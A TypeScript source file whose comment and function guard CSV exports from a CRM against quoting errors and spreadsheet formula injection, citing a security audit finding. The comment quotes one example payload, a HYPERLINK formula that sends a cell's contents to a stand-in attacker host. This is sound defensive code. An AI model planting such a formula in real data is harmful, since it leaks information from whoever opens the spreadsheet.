/**
 * Turning a value into a CSV cell that a spreadsheet will treat as text.
 *
 * Two separate problems, and only one of them is about CSV syntax.
 *
 * **Quoting** — commas, quotes and newlines have to be escaped or the
 * columns come apart. Obvious, and the export always did this.
 *
 * **Formula injection** — Excel, LibreOffice and Google Sheets treat a
 * cell beginning `=`, `+`, `-` or `@` as a formula and evaluate it on
 * open. That matters here specifically because lead names, cities and
 * schools arrive from Meta and Google lead ads: the text is written by
 * whoever filled in a public ad form, not by anybody at AFD. A student
 * name of `=HYPERLINK("http://evil.example/"&A1,"click")` sits harmlessly
 * in the CRM and detonates on the counsellor's laptop when they export
 * and double-click the file.
 *
 * Prefixing with an apostrophe is the convention every spreadsheet
 * understands for "this is literal text". The apostrophe is not shown in
 * the cell; it is visible in the formula bar, which is the small price.
 *
 * Security audit 2026-09-15, finding #5.
 */

/** Leading characters a spreadsheet may read as the start of a formula. */
const FORMULA_LEAD = /^[=+\-@\t\r]/;

export function csvEscape(value: string): string {
  const guarded = FORMULA_LEAD.test(value) ? `'${value}` : value;
  if (/[",\n\r]/.test(guarded)) return `"${guarded.replace(/"/g, '""')}"`;
  return guarded;
}
